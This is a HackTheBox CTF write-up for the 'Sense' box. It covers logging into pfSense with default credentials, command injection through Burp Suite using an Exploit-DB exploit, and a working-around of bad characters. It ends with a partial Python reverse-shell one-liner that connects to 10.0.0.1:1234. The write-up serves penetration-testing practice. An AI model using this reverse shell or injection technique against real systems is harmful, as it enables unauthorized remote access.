---
title: "Sense"
date: 2024-07-28
draft: false
description: "HackTheBox Sense writeup"
tags: ["hackthebox", "htb", "easy"]
categories: ["CTF Writeups"]
showTableOfContents: true
showReadingTime: true
showWordCount: true
---

# Sense

## Overview

- **OS:** OpenBSD
- **IP:** 10.10.10.60
- **Difficulty:** Easy
- **Platform:** HackTheBox
- **OSCP:** No
- **Lists:** N/A

### Summary

Started box sense , used a vulnerability on the pfsense router to allow code injection with burpsuite, got a stable reverse shell with a python script and got the flags and learnt how to workaround bad characters in query.

## Enumeration


nmap scan results

{{< figure src="Untitled 145.png" >}}

dirbusting results

{{< figure src="Untitled 146.png" >}}

{{< figure src="Untitled 147.png" >}}

{{< figure src="Untitled 148.png" >}}

{{< figure src="Untitled 149.png" >}}

homepage

{{< figure src="Untitled 150.png" >}}

visiting system users page

{{< figure src="Untitled 151.png" >}}

## Vulnerabilities


pfsense exploit

https://www.exploit-db.com/exploits/43560

## Exploitation


ok now lets go to the homepage

{{< figure src="Untitled 150.png" >}}

with the information we gathered we know that the username is Rohit and the password is the default pass for a pfsense router which is ‘pfsense’.

{{< figure src="Untitled 152.png" >}}

and we are greeted with this page, now lets check if there are any exploits and see how to execute if there is one present

so on exploit db we found this command injection exploit

{{< figure src="Untitled 153.png" >}}

{{< figure src="Untitled 154.png" >}}

ok so this tells us that it is checking if the database is queues nd then it url encodes the payload followed with pipelining to a shell. 

lets try this approach by modifying the requests with burpsuite

{{< figure src="Untitled 155.png" >}}

we pipeline our command injection to show on our shell that is listening using nc

{{< figure src="Untitled 156.png" >}}

on sending ls and whoami

lets now make it so that it stores the output in a file

{{< figure src="Untitled 157.png" >}}

{{< figure src="Untitled 158.png" >}}

{{< figure src="Untitled 159.png" >}}

we dont get anything when we search for / lets see if the command is correct by checking with some other character.

{{< figure src="Untitled 160.png" >}}

ok so the command is fine , its just the character that is bad , lets check our environment variables.

{{< figure src="Untitled 161.png" >}}

ok nice , we see that the HOME variable points to / , we can make use of this

by modifying our request like this

{{< figure src="Untitled 162.png" >}}

we are able to get a list of files

{{< figure src="Untitled 163.png" >}}

{{< figure src="Untitled 164.png" >}}

we have identified where our flags are located , all that is left is to actually retrieve them now

lets modify the request for this again

{{< figure src="Untitled 165.png" >}}

ok so we cant just use cat like that apparently ,

lets try getting a shell instead by executing a python script for opening a reverse shell

we will use this one from the reverse shell cheat sheet

`python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234))`

now lets run this file

{{< figure src="Untitled 166.png" >}}

{{< figure src="Untitled 167.png" >}}

{{< figure src="Untitled 168.png" >}}

and there we go , we have our shell now we can grab our flags

{{< figure src="Untitled 169.png" >}}

pwned
